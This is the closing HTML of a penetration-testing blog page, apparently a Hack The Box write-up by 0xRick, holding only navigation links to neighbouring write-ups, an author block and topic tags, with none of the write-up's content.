<p>Previous Hack The Box write-up : <a href="/hack-the-box/curling/">Hack The Box - Curling</a><br>Next Hack The Box write-up : <a href="/hack-the-box/redcross/">Hack The Box - RedCross</a></p>

</div>


  <div class="book-comments">
    




  </div>



<script src="/js/book-post.js"></script>

        </div>
      </div>
      <div class="column col-2 hide-lg">
        <div class="book-post-info">
  
    <div class="book-post-meta">

  <div class="author">

    <!-- Author image -->
    <div class="author-img">
      
        <figure class="avatar avatar-lg">
          <img src="/avatar.jpg" alt="...">
        </figure>
      
    </div>

    <!-- Author title -->
    <div class="author-title">
      <div>0xRick</div>
      <div>2019-04-06</div>
    </div>
  </div>

  
    <div class="divider"></div>

    <div class="link">
      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>

      <a class="tag-link" href="/tags/cryptography/" rel="tag">#cryptography</a> <a class="tag-link" href="/tags/forensics/" rel="tag">#forensics</a> <a class="tag-link" href="/tags/linux/" rel="tag">#linux</a> <a class="tag-link" href="/tags/networking/" rel="tag">#networking</a> <a class="tag-link" href="/tags/pivoting/" rel="tag">#pivoting</a> <a class="tag-link" href="/tags/rce/" rel="tag">#rce</a> <a class="tag-link" href="/tags/ssh/" rel="tag">#ssh</a> <a class="tag-link" href="/tags/web/" rel="tag">#web</a>
    </div>
    
  

  <div class="divider"></div>
</div>
  

  <div class="book-tocbot">
</div>
<div class="book-tocbot-menu">
  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
  <a onclick="go_top()">Back to top</a>
  <a onclick="go_bottom()">Go to bottom</a>
</div>


<script src="/js/book-toc.js"></script>

</div>
      </div>
    </div>
  </div>
  
  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
</div>

</body>
</html>


<script src="/js/book.js"></script>
